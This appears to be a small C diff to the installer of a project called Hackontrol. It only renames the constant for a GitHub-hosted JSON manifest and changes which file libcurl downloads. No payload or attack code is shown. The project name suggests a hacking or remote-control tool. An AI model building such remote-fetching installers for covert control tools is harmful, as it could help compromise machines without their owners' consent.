@@ -2,7 +2,7 @@
 #define CURL_STATICLIB
 #include <curl/curl.h>
 
-#define LATEST_JSON "https://raw.githubusercontent.com/KHOPAN/Hackontrol/refs/heads/main/system/latest.json"
+#define SYSTEM_JSON "https://raw.githubusercontent.com/KHOPAN/Hackontrol/refs/heads/main/system/system.json"
 
 static const LPCWSTR programName = L"Hackontrol Installer";
 
@@ -96,7 +96,7 @@ int main(int argc, char** argv) {
 		goto easyCleanup;
 	}
 
-	if((code = curl_easy_setopt(curl, CURLOPT_URL, LATEST_JSON)) != CURLE_OK) {
+	if((code = curl_easy_setopt(curl, CURLOPT_URL, SYSTEM_JSON)) != CURLE_OK) {
 		curlError(L"curl_easy_setopt(CURLOPT_URL)", code, NULL);
 		goto easyCleanup;
 	}
